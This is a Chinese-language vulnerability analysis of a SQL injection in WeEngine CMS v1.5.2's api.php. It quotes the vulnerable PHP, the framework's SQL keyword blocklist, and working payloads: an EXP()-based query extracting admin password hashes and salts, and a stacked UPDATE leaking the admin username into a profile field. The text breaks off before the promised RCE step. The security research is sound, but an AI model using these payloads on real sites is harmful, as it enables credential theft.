微擎 CMS：从 SQL 到 RCE
0x01 写在前⾯
微擎 CMS 在 2.0 版本的时候悄咪咪修复了⼀处 SQL 注⼊漏洞：
api.php 536 ⾏
该处的注⼊漏洞⽹上没有出现过分析⽂章，因此本⽂就来分析⼀下该处 SQL 注⼊的利⽤。
0x02 影响版本
经过测试发现，官⽹在 GitLee 上，在 v1.5.2  存在此漏洞，在 2.0  版本修复了该漏洞，因此
⽬测⾄少影响到 v1.5.2 版本
0x03 SQL 注⼊漏洞分析
这个注⼊漏洞分析还是⽐较简单的，直接定位到存在漏洞的代码处 api.php  530 ⾏开始、
564 ⾏开始的两个函数：
private function analyzeSubscribe(&$message) {
    global $_W;
    $params = array();
    $message['type'] = 'text';
    $message['redirection'] = true;
    if(!empty($message['scene'])) {
      $message['source'] = 'qr';
      $sceneid = trim($message['scene']);
      $scene_condition = '';
      if (is_numeric($sceneid)) {
        $scene_condition = " `qrcid` = '{$sceneid}'";
      }else{
        $scene_condition = " `scene_str` = '{$sceneid}'";
      }
      $qr = pdo_fetch("SELECT `id`, `keyword` FROM " . 
tablename('qrcode') . " WHERE {$scene_condition} AND `uniacid` = 
'{$_W['uniacid']}'");
      if(!empty($qr)) {
        $message['content'] = $qr['keyword'];
        if (!empty($qr['type']) && $qr['type'] == 'scene') {
          $message['msgtype'] = 'text';
        }
        $params += $this->analyzeText($message);
        return $params;
      }
    }
    $message['source'] = 'subscribe';
    $setting = uni_setting($_W['uniacid'], array('welcome'));
    if(!empty($setting['welcome'])) {
      $message['content'] = $setting['welcome'];
      $params += $this->analyzeText($message);
    }
    return $params;
  }
  private function analyzeQR(&$message) {
    global $_W;
    $params = array();
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
    $params = $this->handler($message['type']);
    if (!empty($params)) {
      return $params;
    }
    $message['type'] = 'text';
    $message['redirection'] = true;
    if(!empty($message['scene'])) {
      $message['source'] = 'qr';
      $sceneid = trim($message['scene']);
      $scene_condition = '';
      if (is_numeric($sceneid)) {
        $scene_condition = " `qrcid` = '{$sceneid}'";
      }else{
        $scene_condition = " `scene_str` = '{$sceneid}'";
      }
      $qr = pdo_fetch("SELECT `id`, `keyword` FROM " . 
tablename('qrcode') . " WHERE {$scene_condition} AND `uniacid` = 
'{$_W['uniacid']}'");
    }
    if (empty($qr) && !empty($message['ticket'])) {
      $message['source'] = 'qr';
      $ticket = trim($message['ticket']);
      if(!empty($ticket)) {
        $qr = pdo_fetchall("SELECT `id`, `keyword` FROM " . 
tablename('qrcode') . " WHERE `uniacid` = '{$_W['uniacid']}' AND ticket 
= '{$ticket}'");
        if(!empty($qr)) {
          if(count($qr) != 1) {
            $qr = array();
          } else {
            $qr = $qr[0];
          }
        }
      }
    }
    if(!empty($qr)) {
      $message['content'] = $qr['keyword'];
      if (!empty($qr['type']) && $qr['type'] == 'scene') {
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
在 analyzeSubscribe 函数中的 SQL 语句：
直接将 $scene_condition 变量拼接到了 pod_fetch 函数中，⽽ $scene_condition 变量
值来⾃于 $sceneid = trim($message['scene']); ，可以看到仅仅是做了移除字符串两
侧空⽩字符处理。那么就可以通过构造 $message['scene'] 的值，去构造 SQL 语句。
在 analyzeQR 函数中也是类似，因此我们以 analyzeSubscribe 函数为例来分析构造poc。
0x04 SQL 注⼊构造分析
微擎中为了避免 SQL注⼊，实现了包括参数化查询、关键字&字符过滤的⽅式。
过滤的内容如下：
framework/class/db.class.php  700 ⾏：
        $message['msgtype'] = 'text';
      }
      $params += $this->analyzeText($message);
    }
    return $params;
  }
73
74
75
76
77
78
$qr = pdo_fetch("SELECT `id`, `keyword` FROM " . tablename('qrcode') . 
" WHERE {$scene_condition} AND `uniacid` = '{$_W['uniacid']}'");
1
private static $disable = array(
    'function' => array('load_file', 'floor', 'hex', 'substring', 'if', 
'ord', 'char', 'benchmark', 'reverse', 'strcmp', 'datadir', 
'updatexml', 'extractvalue', 'name_const', 'multipoint', 'database', 
'user'),
    'action' => array('@', 'intooutfile', 'intodumpfile', 
'unionselect', 'uniondistinct', 'information_schema', 'current_user', 
'current_date'),
    'note' => array('/*', '*/', '#', '--'),
  );
1
2
3
4
5
可以看到禁⽤了以下函数：
load_file、floor、hex、substring、if、ord、char、benchmark、reverse、reverse、strcmp、
datadir、datadir、updatexml、extractvalue、name_const、multipoint、database、user
禁⽤了以下关键字：
@、into outfile、into dumpfile、union select、union all、union distinct、
information_schema、current_user、current_date
禁⽤了以下注释符：
/* 、 */ 、 -- 、 #
所以对于构造 payload 来说还是造成了⼀定的⿇烦。
⾸先将函数中 SQL 语句还原如下：
那么如果我们想查询到管理员账号密码且不包含相关敏感字符，则可以使⽤ exp语句，如下⽰
例：
具体构建由于本地 MySQL 版本不合适，因此就不写了。
这⾥来说下另⼀种注⼊⽅式。
我们知道微擎⾥的 SQL 语句使⽤的是 PDO 查询，因此⽀持堆叠注⼊。
但要注意的是，使⽤ PDO 执⾏ SQL 语句时，虽然可以执⾏多条 SQL语句，但只会返回第⼀
条 SQL 语句的执⾏结果，所以第⼆条语句中需要使⽤ update 更新数据且该数据我们可以通过
页⾯看到，这样才可以获取数据。
SELECT `id`, `keyword` FROM ims_qrcode where `scene_str` = ? and 
uniacid = $_W['uniacid'];
1
SELECT `id`, `keyword` FROM ims_qrcode where `scene_str` = 1 AND(EXP(~
(SELECT*from(select 
group_concat(0x7B,uid,0x23,password,0x23,salt,0x23,lastvisit,0x23,lasti
p,0x7D) from we7.ims_users)a))) and uniacid = $_W['uniacid'];
1
经过测试发现，微擎⽀持注册⽤户，如下图所⽰：
登陆后可以在个⼈中⼼看到：
邮寄地址就是⼀个很好的显⽰地⽅，也就是说可以执⾏以下语句。
语句中的 2 是注册后账号的uid，可以从 cookie中找到： 
但是这⾥有⼀个问题，就是在我们注⼊的时候，⾸先要验证：
api.php  181⾏：
跟进 checkSign() ：
update ims_users_profile set address=(select username from ims_users 
where uid =1 ) where uid=2;
1
if(empty($this->account)) {
      exit('Miss Account.');
}
if(!$this->account->checkSign()) {
      exit('Check Sign Fail.');
}
1
2
3
4
5
6
可以看到有三个变量需要我们去验证，其⽣成规则在 api.php  129 ⾏的 encrypt 函数，如
下：
public function checkSign() {
    $arrParams = array(
      $token = $this->account['token'],
      $intTimeStamp = $_GET['timestamp'],
      $strNonce = $_GET['nonce'],
    );
    sort($arrParams, SORT_STRING);
    $strParam = implode($arrParams);
    $strSignature = sha1($strParam);
    return $strSignature == $_GET['signature'];
  }
1
2
3
4
5
6
7
8
9
10
11
12
13
public function encrypt() {
    global $_W;
    if(empty($this->account)) {
      exit('Miss Account.');
    }
    $timestamp = TIMESTAMP;
    $nonce = random(5);
    $token = $_W['account']['token'];
    $signkey = array($token, TIMESTAMP, $nonce);
    sort($signkey, SORT_STRING);
    $signString = implode($signkey);
    $signString = sha1($signString);
    $_GET['timestamp'] = $timestamp;
    $_GET['nonce'] = $nonce;
    $_GET['signature'] = $signString;
    $postStr = file_get_contents('php://input');
    if(!empty($_W['account']['encodingaeskey']) && 
strlen($_W['account']['encodingaeskey']) == 43 && !empty($_W['account']
['key']) && $_W['setting']['development'] != 1) {
1
2
3
4
5
6
7
8
9
10
11
12
13